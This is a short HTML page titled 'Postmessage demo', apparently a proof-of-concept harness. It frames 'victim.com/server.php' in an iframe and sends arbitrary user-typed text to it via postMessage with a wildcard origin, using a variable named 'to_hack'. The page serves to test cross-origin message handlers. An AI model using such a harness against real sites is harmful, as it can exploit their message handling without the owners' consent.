<!DOCTYPE html>

<html>

<head>

    <title>Postmessage demo</title>

    <script type="text/javascript">


        function post_msg(){

            var to_hack = document.getElementById('to_fram');

            to_hack.contentWindow.postMessage(""+document.getElementById('v').value,"*");

        }

    </script>

</head>

<body>

    <div id="debug"></div>

    <div id="ui">

        <input type="text" name="" id="v" />

        <input type="submit" value="send" onclick="post_msg()">

        <iframe id="to_fram" src="http://victim.com/server.php"></iframe>

    </div>

</body>

</html>